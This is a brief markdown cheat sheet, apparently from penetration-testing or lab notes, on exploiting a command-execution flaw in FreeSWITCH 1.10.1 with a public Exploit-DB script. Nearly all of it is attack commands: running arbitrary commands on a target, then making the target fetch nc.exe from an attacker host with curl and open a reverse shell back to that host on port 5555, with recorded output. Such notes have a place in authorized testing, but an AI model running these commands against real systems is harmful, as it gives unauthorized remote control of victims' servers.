# FreeSWITCH 1.10.1 - Command Execution

Reference: https://www.exploit-db.com/raw/47799

### Command execution

```bash
./freeswitch-exploit.py 192.168.1.100 whoami
```

### Reverse shell

```bash
python3 exp.py 192.168.227.151 'curl http://192.168.45.219/nc.exe -o c:\windows\temp\nc.exe'
# Authenticated
# -ERR no reply

python3 exp.py 192.168.227.151 'c:\windows\temp\nc.exe 192.168.45.219 5555 -e cmd'
# Authenticated
```
